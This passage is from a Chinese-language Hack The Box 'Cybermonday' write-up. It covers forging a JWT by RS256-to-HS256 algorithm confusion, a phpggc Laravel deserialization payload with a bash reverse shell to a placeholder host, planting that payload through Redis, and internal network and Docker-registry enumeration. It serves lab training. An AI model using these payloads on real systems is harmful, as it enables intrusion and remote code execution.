+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;keys&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">		<span class="punctuation">&#123;</span></span><br><span class="line">			<span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RSA&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;use&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sig&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;RS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;n&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pvezvAKCOgxwsiyV6PRJfGMul-WBYorwFIWudWKkGejMx3onUSlM8OA3PjmhFNCP_8jJ7WA2gDa8oP3N2J8zFyadnrt2Xe59FdcLXTPxbbfFC0aTGkDIOPZYJ8kR0cly0fiZiZbg4VLswYsh3Sn797IlIYr6Wqfc6ZPn1nsEhOrwO-qSD4Q24FVYeUxsn7pJ0oOWHPD-qtC5q3BR2M_SxBrxXh9vqcNBB3ZRRA0H0FDdV6Lp_8wJY7RB8eMREgSe48r3k7GlEcCLwbsyCyhngysgHsq6yJYM82BL7V8Qln42yij1BM7fCu19M1EZwR5eJ2Hg31ZsK5uShbITbRh16w&quot;</span><span class="punctuation">,</span></span><br><span class="line">			<span class="attr">&quot;e&quot;</span><span class="punctuation">:</span> <span class="string">&quot;AQAB&quot;</span></span><br><span class="line">		<span class="punctuation">&#125;</span></span><br><span class="line">	<span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>然後查看根，列出了一堆API。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// curl http://webhooks-api-beta.cybermonday.htb</span></span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;status&quot;</span><span class="punctuation">:</span> <span class="string">&quot;success&quot;</span><span class="punctuation">,</span>                                                                                                                                                                                                     <span class="punctuation">[</span><span class="number">0</span>/<span class="number">1166</span><span class="punctuation">]</span></span><br><span class="line">  <span class="attr">&quot;message&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>  </span><br><span class="line">    <span class="attr">&quot;routes&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>     </span><br><span class="line">      <span class="attr">&quot;/auth/register&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>                             </span><br><span class="line">        <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;POST&quot;</span><span class="punctuation">,</span>           </span><br><span class="line">        <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>                         </span><br><span class="line">          <span class="string">&quot;username&quot;</span><span class="punctuation">,</span>                                 </span><br><span class="line">          <span class="string">&quot;password&quot;</span>             </span><br><span class="line">        <span class="punctuation">]</span>                                             </span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span>                                              </span><br><span class="line">      <span class="attr">&quot;/auth/login&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>        </span><br><span class="line">        <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;POST&quot;</span><span class="punctuation">,</span>             </span><br><span class="line">        <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>                                                                                                                                                                                                              </span><br><span class="line">          <span class="string">&quot;username&quot;</span><span class="punctuation">,</span>   </span><br><span class="line">          <span class="string">&quot;password&quot;</span>                                  </span><br><span class="line">        <span class="punctuation">]</span>                             </span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span>                                       </span><br><span class="line">      <span class="attr">&quot;/webhooks&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span>                                                                                                                                                                                                             </span><br><span class="line">        <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;GET&quot;</span>                                                                                                                                                                                                          </span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span>                                              </span><br><span class="line">      <span class="attr">&quot;/webhooks/create&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">        <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;POST&quot;</span><span class="punctuation">,</span>             </span><br><span class="line">        <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span>                                 </span><br><span class="line">          <span class="string">&quot;name&quot;</span><span class="punctuation">,</span>                                                                                              </span><br><span class="line">          <span class="string">&quot;description&quot;</span><span class="punctuation">,</span>                                                                                       </span><br><span class="line">          <span class="string">&quot;action&quot;</span>                                                                                             </span><br><span class="line">        <span class="punctuation">]</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span>            </span><br><span class="line">      <span class="attr">&quot;/webhooks/delete:uuid&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;DELETE&quot;</span></span><br><span class="line">      <span class="punctuation">&#125;</span><span class="punctuation">,</span>               </span><br><span class="line">      <span class="attr">&quot;/webhooks/:uuid&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span> <span class="string">&quot;POST&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;actions&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span> </span><br><span class="line">          <span class="attr">&quot;sendRequest&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="string">&quot;url&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;method&quot;</span></span><br><span class="line">            <span class="punctuation">]</span>          </span><br><span class="line">          <span class="punctuation">&#125;</span><span class="punctuation">,</span>     </span><br><span class="line">          <span class="attr">&quot;createLogFile&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">              <span class="string">&quot;log_name&quot;</span><span class="punctuation">,</span></span><br><span class="line">              <span class="string">&quot;log_content&quot;</span></span><br><span class="line">            <span class="punctuation">]</span>     </span><br><span class="line">          <span class="punctuation">&#125;</span>          </span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">      <span class="punctuation">&#125;</span>                  </span><br><span class="line">    <span class="punctuation">&#125;</span>                  </span><br><span class="line">  <span class="punctuation">&#125;</span>              </span><br><span class="line"><span class="punctuation">&#125;</span>  </span><br></pre></td></tr></table></figure>
+
+<p>然後嘗試玩一下這個webhook，<code>/webhooks/create</code>​ 對這個比較感興趣。</p>
+<ol>
+<li>嘗試 <code>POST /webhooks/create</code>​ ，返回 <code>&#123;&quot;status&quot;:&quot;error&quot;,&quot;message&quot;:&quot;Unauthorized&quot;&#125;</code>​。</li>
+<li>隨便注冊一個賬號：<code>POST /auth/register</code>​ ，返回 <code>&#123;&quot;status&quot;:&quot;success&quot;,&quot;message&quot;:&quot;success&quot;&#125;</code>​。</li>
+<li>登錄：<code>POST /auth/login</code>​ ，返回 <code>&#123;&quot;status&quot;:&quot;success&quot;,&quot;message&quot;:&#123;&quot;x-access-token&quot;:&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtIiwicm9sZSI6InVzZXIifQ.ALz7wcxLB0Kp1TL5pHvXNUYDVfy40BebZoi_Op1MzAbyW7vpPNH0b6PhsSsTJjm-1E5KU4sR0n6xJoffR9aQDqsgjj9qyaxP_hQ6YuXGAjkilVSgz02Ioi-IE-03y295D-C83UO3utMxJPj3JYb-UDIbA6iCaIq59aojeP_gjL33wSof5tJFx5kzzNndgwPf88QvqgUwYW85n7VmC3XJZ0nd3bVaPcUlmaTakkuEYn8YcraL2zsSOtU3Ek9jwxAvy6_XE2pIb6nEgyKI8SmI2zc0qYabXNmxRNoXUadlwi5VOr1goCqGh4ZvbuB0TdcYfG48Zm7hBlwS6D2souTG7g&quot;&#125;&#125;</code>​，在發現token有三個點，是JWT格式。</li>
+<li>現在 <code>POST /webhooks/create</code>​ ，返回 <code>&#123;&quot;status&quot;:&quot;error&quot;,&quot;message&quot;:&quot;Unauthorized&quot;&#125;</code>​ 看起來沒有權限創建一個 <code>webhooks</code>​。</li>
+</ol>
+<h2 id="0x5-嘗試繞過JWT"><a href="#0x5-嘗試繞過JWT" class="headerlink" title="0x5 嘗試繞過JWT"></a>0x5 嘗試繞過JWT</h2><p>思考了很久，有些不是很合理的地方，比如 <code>jwks.json</code>​ 這個敏感的文件就不應該會出現，如果逆向思考的話作者可能想希望我們利用這幾個文件而做一些事情，思考了一下，會不會是修改 jwt 的算法了。</p>
+<p>通過這個網站 <a target="_blank" rel="noopener" href="https://jwt.io/">https://jwt.io/</a> 發現上面的JWT如下 </p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Encoded</span></span><br><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpZCI6MiwidXNlcm5hbWUiOiJtIiwicm9sZSI6InVzZXIifQ.ALz7wcxLB0Kp1TL5pHvXNUYDVfy40BebZoi_Op1MzAbyW7vpPNH0b6PhsSsTJjm-1E5KU4sR0n6xJoffR9aQDqsgjj9qyaxP_hQ6YuXGAjkilVSgz02Ioi-IE-03y295D-C83UO3utMxJPj3JYb-UDIbA6iCaIq59aojeP_gjL33wSof5tJFx5kzzNndgwPf88QvqgUwYW85n7VmC3XJZ0nd3bVaPcUlmaTakkuEYn8YcraL2zsSOtU3Ek9jwxAvy6_XE2pIb6nEgyKI8SmI2zc0qYabXNmxRNoXUadlwi5VOr1goCqGh4ZvbuB0TdcYfG48Zm7hBlwS6D2souTG7g</span><br><span class="line"></span><br><span class="line"><span class="comment"># Header</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span>,</span><br><span class="line">  <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;RS256&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Payload </span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;id&quot;</span>: 2,</span><br><span class="line">  <span class="string">&quot;username&quot;</span>: <span class="string">&quot;m&quot;</span>,</span><br><span class="line">  <span class="string">&quot;role&quot;</span>: <span class="string">&quot;user&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最初的想法是更改 role 變成 admin，因爲RS256算法需要 private key 和 public key，然而並不知道private key。但是可以嘗試修改成HS256，如果服務器接受HS256算法的話，那麽只需要 public key 就可以簽名了。</p>
+<p>‍</p>
+<p>然後谷歌搜索了下，搜索關於JWT的n和e是什麽，看到了這篇文章：</p>
+<p><a target="_blank" rel="noopener" href="https://datatracker.ietf.org/doc/html/rfc7518#section-6.3.1.2">https://datatracker.ietf.org/doc/html/rfc7518#section-6.3.1.2</a> </p>
+<p><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/70022898/what-does-e-aqab-mean-in-jwks">https://stackoverflow.com/questions/70022898/what-does-e-aqab-mean-in-jwks</a></p>
+<p>‍</p>
+<p>現在知道n是Public key，所以現在想辦法得到public key，就要寫程序，呃，因爲不怎麽會寫，隨手問了一下 ChatGPT，結果秒出。。。。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023224300-hwxx8wy.png" alt="image">​</p>
+<p>‍</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> urlsafe_b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_public_key</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;jwks.json&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        data = json.load(file)</span><br><span class="line">      </span><br><span class="line">        <span class="comment"># Assuming there is only one key in the &#x27;keys&#x27; array</span></span><br><span class="line">        key = data[<span class="string">&#x27;keys&#x27;</span>][<span class="number">0</span>]</span><br><span class="line">      </span><br><span class="line">        modulus = <span class="built_in">int</span>.from_bytes(urlsafe_b64decode(key[<span class="string">&#x27;n&#x27;</span>] + <span class="string">&#x27;==&#x27;</span>), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">        exponent = <span class="built_in">int</span>.from_bytes(urlsafe_b64decode(key[<span class="string">&#x27;e&#x27;</span>] + <span class="string">&#x27;==&#x27;</span>), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">      </span><br><span class="line">        <span class="comment"># Construct the RSA public key</span></span><br><span class="line">        public_key = RSA.construct((modulus, exponent))</span><br><span class="line">      </span><br><span class="line">        <span class="keyword">return</span> public_key</span><br><span class="line"></span><br><span class="line"><span class="comment"># Usage example</span></span><br><span class="line">public_key = get_public_key()</span><br><span class="line"><span class="built_in">print</span>(public_key.export_key().decode())</span><br></pre></td></tr></table></figure>
+
+<p>得到Public Key</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023224324-k3ivhm0.png" alt="image">​</p>
+<h2 id="0x6-使用burp注入JWT"><a href="#0x6-使用burp注入JWT" class="headerlink" title="0x6 使用burp注入JWT"></a>0x6 使用burp注入JWT</h2><p>Burp安裝 <code>JWT Editor</code>​ 和 <code>JSON Web Tokens</code>​ 這兩個插件，然後</p>
+<p>首先要把上面的public key encode 一下，得到 <code>LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwdmV6dkFLQ09neHdzaXlWNlBSSgpmR011bCtXQllvcndGSVd1ZFdLa0dlak14M29uVVNsTThPQTNQam1oRk5DUC84ako3V0EyZ0RhOG9QM04ySjh6CkZ5YWRucnQyWGU1OUZkY0xYVFB4YmJmRkMwYVRHa0RJT1BaWUo4a1IwY2x5MGZpWmlaYmc0Vkxzd1lzaDNTbjcKOTdJbElZcjZXcWZjNlpQbjFuc0VoT3J3TytxU0Q0UTI0RlZZZVV4c243cEowb09XSFBEK3F0QzVxM0JSMk0vUwp4QnJ4WGg5dnFjTkJCM1pSUkEwSDBGRGRWNkxwLzh3Slk3UkI4ZU1SRWdTZTQ4cjNrN0dsRWNDTHdic3lDeWhuCmd5c2dIc3E2eUpZTTgyQkw3VjhRbG40MnlpajFCTTdmQ3UxOU0xRVp3UjVlSjJIZzMxWnNLNXVTaGJJVGJSaDEKNndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==</code>​</p>
+<p>然後修改 <code>K</code>​ 裏面的内容，貼上去。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023232128-t59eks5.png" alt="image">​</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;kty&quot;</span><span class="punctuation">:</span> <span class="string">&quot;oct&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;kid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;d7aed87f-932a-417e-957b-30fc13722f6a&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;k&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUFwdmV6dkFLQ09neHdzaXlWNlBSSgpmR011bCtXQllvcndGSVd1ZFdLa0dlak14M29uVVNsTThPQTNQam1oRk5DUC84ako3V0EyZ0RhOG9QM04ySjh6CkZ5YWRucnQyWGU1OUZkY0xYVFB4YmJmRkMwYVRHa0RJT1BaWUo4a1IwY2x5MGZpWmlaYmc0Vkxzd1lzaDNTbjcKOTdJbElZcjZXcWZjNlpQbjFuc0VoT3J3TytxU0Q0UTI0RlZZZVV4c243cEowb09XSFBEK3F0QzVxM0JSMk0vUwp4QnJ4WGg5dnFjTkJCM1pSUkEwSDBGRGRWNkxwLzh3Slk3UkI4ZU1SRWdTZTQ4cjNrN0dsRWNDTHdic3lDeWhuCmd5c2dIc3E2eUpZTTgyQkw3VjhRbG40MnlpajFCTTdmQ3UxOU0xRVp3UjVlSjJIZzMxWnNLNXVTaGJJVGJSaDEKNndJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg==&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>​</p>
+<p>不需要在網頁簽名，可以直接使用burp簽名，然後直接修改包就可以了。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023231908-bqidi4m.png" alt="image">​</p>
+<p>‍</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023231444-i8xewxk.png" alt="image">​</p>
+<p>‍</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023232048-zzvnjqw.png" alt="image">​</p>
+<h2 id="0x7-WebHook-主動請求，思考下一步"><a href="#0x7-WebHook-主動請求，思考下一步" class="headerlink" title="0x7 WebHook 主動請求，思考下一步"></a>0x7 WebHook 主動請求，思考下一步</h2><p>​​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023235031-zllja1f.png" alt="image">​​</p>
+<p>這裏的WebHook可以主動發起請求，和枚舉了一段時間，沒有發現什麽有意思的内容。</p>
+<p>然後想到了一個思路，Redis作爲Laravel的cookie緩存容器，Laravel會主動請求Redis（因爲請求是固定寫好的是，所以沒辦法exploit），但是儅Redis返回内容是惡意的情況下，儅Laravel會主動deserialization裏面的内容就可以執行reverse shell，也就是説如果我可以控制 Redis 返回的内容，我就有機會在Laravel deserialization的時候執行reverse shell。</p>
+<p>很巧的是Redis有提供REST的API，通過RestAPI 嘗試修改當前的cookie，把他換成惡意的cookie，</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023234854-zyinlr8.png" alt="image"></p>
+<h2 id="0x8-準備-payload"><a href="#0x8-準備-payload" class="headerlink" title="0x8 準備 payload"></a>0x8 準備 payload</h2><p>SET可以工作，剩下的就是準備payload了。</p>
+<p>製作 deserialization 的php payload可以使用phpggc，看了一下， RCE10 是最好的（因爲 __toString ，比較適合現在的環境）。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231023235252-gk3sl3u.png" alt="image">​</p>
+<p>所以希望可以在php上執行 system(“&#x2F;bin&#x2F;bash xxxx”) 的函數，所以下面就製作payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./phpggc Laravel/RCE10 SYSTEM <span class="string">&#x27;/bin/bash -c &quot;/bin/bash -i &gt;&amp; /dev/tcp/xxxx/1111 0&gt;&amp;1&quot;&#x27;</span></span><br><span class="line">O:38:<span class="string">&quot;Illuminate\Validation\Rules\RequiredIf&quot;</span>:1:&#123;s:9:<span class="string">&quot;condition&quot;</span>;a:2:&#123;i:0;O:28:<span class="string">&quot;Illuminate\Auth\RequestGuard&quot;</span>:3:&#123;s:8:<span class="string">&quot;callback&quot;</span>;s:14:<span class="string">&quot;call_user_func&quot;</span>;s:7:<span class="string">&quot;request&quot;</span>;s:6:<span class="string">&quot;SYSTEM&quot;</span>;s:8:<span class="string">&quot;provider&quot;</span>;s:61:<span class="string">&quot;/bin/bash -c &quot;</span>/bin/bash -i &gt;&amp; /dev/tcp/xxxx/1111 0&gt;&amp;1<span class="string">&quot;&quot;</span>;&#125;i:1;s:4:<span class="string">&quot;user&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>用這個工具可以方便處理特殊符號，<a target="_blank" rel="noopener" href="https://onlinestringtools.com/escape-string">https://onlinestringtools.com/escape-string</a></p>
+<h2 id="0x9-想辦法在-Redis-中尋找當前的key，以便注入，得到webshell"><a href="#0x9-想辦法在-Redis-中尋找當前的key，以便注入，得到webshell" class="headerlink" title="0x9 想辦法在 Redis 中尋找當前的key，以便注入，得到webshell"></a>0x9 想辦法在 Redis 中尋找當前的key，以便注入，得到webshell</h2><p>因爲要注入當前的cookie，在谷歌的過程中發現了神奇的内容原來laravel是可以通過APP_KEY 解密。</p>
+<p>參考：<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel">https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/laravel</a></p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231024000909-syceab6.png" alt="image">​</p>
+<p>然後就得到了 <code>25c6a7ecd50b519b7758877cdc95726f29500d4c</code>​​ 和 <code>6AGr0idR2a6TzouAfXs6hq7HOopPx0lkCS44SHRf</code>​​ 比較像key的值。</p>
+<p>在上面的 .env 文件中，有這樣定義的。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">REDIS_HOST=redis        </span><br><span class="line">REDIS_PASSWORD=                                     </span><br><span class="line">REDIS_PORT=<span class="number">6379</span>   </span><br><span class="line">REDIS_PREFIX=laravel_session<span class="punctuation">:</span>                                                                                </span><br><span class="line">CACHE_PREFIX=   </span><br></pre></td></tr></table></figure>
+
+<p>所以完整的請求應該像這樣：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET <span class="string">&quot;laravel_session:&lt;KEY&gt;&quot;</span> <span class="string">&quot;&lt;REVERSHELL_PAYLOAD&gt;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>因爲上面有兩個Key，所以發2遍看看效果。</p>
+<p>然後測試了很久，都沒有反應，本地debug了下，在 payload 後加入 <code>\r\n</code>​ 就好了。</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231024001926-sz8dj30.png" alt="image"></p>
+<p>然後刷新一下網頁，laravel去數據庫獲取cookie的時候就會執行webshell。</p>
+<p>看到 <code>/mnt</code>​​ 下面挂在了john的 home</p>
+<p>​<img src="https://files.manesec.com/file/maneimg1/2023-htb/Cybermonday/image-20231024002107-2w8da8r.png" alt="image">​</p>
+<h1 id="0xA-nginx-server-搜索可用的信息，找到webhook源碼，利用它得到LFI，拿到user的賬號密碼。"><a href="#0xA-nginx-server-搜索可用的信息，找到webhook源碼，利用它得到LFI，拿到user的賬號密碼。" class="headerlink" title="0xA (nginx server) 搜索可用的信息，找到webhook源碼，利用它得到LFI，拿到user的賬號密碼。"></a>0xA (nginx server) 搜索可用的信息，找到webhook源碼，利用它得到LFI，拿到user的賬號密碼。</h1><p>以下是LinPEAS發現的信息：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">╔══════════╣ Hostname, hosts and DNS</span><br><span class="line">070370e2cdc4</span><br><span class="line">127.0.0.1       localhost</span><br><span class="line">::1     localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0 ip6-localnet</span><br><span class="line">ff00::0 ip6-mcastprefix</span><br><span class="line">ff02::1 ip6-allnodes</span><br><span class="line">ff02::2 ip6-allrouters</span><br><span class="line">172.18.0.4      070370e2cdc4</span><br><span class="line">nameserver 127.0.0.11</span><br><span class="line">options ndots:0</span><br><span class="line"></span><br><span class="line">╔══════════╣ Interesting Files Mounted</span><br><span class="line">/dev/sda1 on /mnt <span class="built_in">type</span> ext4 (ro,relatime,errors=remount-ro)</span><br><span class="line">/dev/sda1 on /etc/resolv.conf <span class="built_in">type</span> ext4 (rw,relatime,errors=remount-ro)</span><br><span class="line">/dev/sda1 on /etc/hostname <span class="built_in">type</span> ext4 (rw,relatime,errors=remount-ro)</span><br><span class="line">/dev/sda1 on /etc/hosts <span class="built_in">type</span> ext4 (rw,relatime,errors=remount-ro)</span><br></pre></td></tr></table></figure>
+
+<p>nmap無法使用，可以使用reverse socks 然後套nmap，這裏我就快速使用Bash自製脚本快速掃描一下，所以猜測如下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[+] 172.18.0.1: 22 open     - hosts</span><br><span class="line">[+] 172.18.0.2: 80 open     - nginx server</span><br><span class="line">[+] 172.18.0.3: 80 open     - webhook</span><br><span class="line">[+] 172.18.0.4: 9000 open   - Unknow</span><br><span class="line">[+] 172.18.0.5: 5000 open   - Docker Registry</span><br><span class="line">[+] 172.18.0.6: 6379 open   - redis</span><br><span class="line">[+] 172.18.0.7: 3306 open   - mysql</span><br></pre></td></tr></table></figure>
+
+<p>看到了有 Docker Registry，隨手一個curl看看，</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># proxychains -f ./proxychains.conf curl http://172.18.0.5:5000/v2                  </span></span><br><span class="line">&lt;a href=<span class="string">&quot;/v2/&quot;</span>&gt;Moved Permanently&lt;/a&gt;.</span><br><span class="line"></span><br><span class="line"><span class="comment"># proxychains -f ./proxychains.conf curl http://172.18.0.5:5000/v2/_catalog</span></span><br><span class="line">&#123;<span class="string">&quot;repositories&quot;</span>:[<span class="string">&quot;cybermonday_api&quot;</span>]&#125;</span><br></pre></td></tr></table></figure>
+
+<p>發現這個 docker registry 居然有容器，所以使用Docker Registry Grabber下載所有tar壓縮包。</p>
